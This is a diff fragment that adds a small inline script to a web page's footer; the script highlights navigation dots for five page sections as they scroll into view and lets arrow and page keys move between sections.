+</footer>
+
+<script>
+(function(){
+  var ids = ["s1","s2","s3","s4","s5"];
+  var dots = {};
+  ids.forEach(function(id){ dots[id] = document.querySelector('[data-dot="' + id + '"]'); });
+
+  function setActive(id){
+    ids.forEach(function(k){
+      if (dots[k]) dots[k].setAttribute("aria-current", k === id ? "true" : "false");
+    });
+  }
+  setActive("s1");
+
+  if ("IntersectionObserver" in window) {
+    var io = new IntersectionObserver(function(entries){
+      entries.forEach(function(e){ if (e.isIntersecting) setActive(e.target.id); });
+    }, { rootMargin: "-45% 0px -45% 0px" });
+    ids.forEach(function(id){
+      var el = document.getElementById(id);
+      if (el) io.observe(el);
+    });
+  }
+
+  function currentIndex(){
+    var best = 0, bestTop = Infinity;
+    ids.forEach(function(id, i){
+      var el = document.getElementById(id);
+      if (!el) return;
+      var t = Math.abs(el.getBoundingClientRect().top);
+      if (t < bestTop){ bestTop = t; best = i; }
+    });
+    return best;
+  }
+
+  function go(delta){
+    var next = Math.min(ids.length - 1, Math.max(0, currentIndex() + delta));
+    var el = document.getElementById(ids[next]);
+    if (el) el.scrollIntoView({ behavior: "smooth", block: "start" });
+  }
+
+  document.addEventListener("keydown", function(ev){
+    if (ev.metaKey || ev.ctrlKey || ev.altKey) return;
+    if (ev.key === "ArrowRight" || ev.key === "PageDown"){ ev.preventDefault(); go(1); }
+    else if (ev.key === "ArrowLeft" || ev.key === "PageUp"){ ev.preventDefault(); go(-1); }
+  });
+})();
+</script>
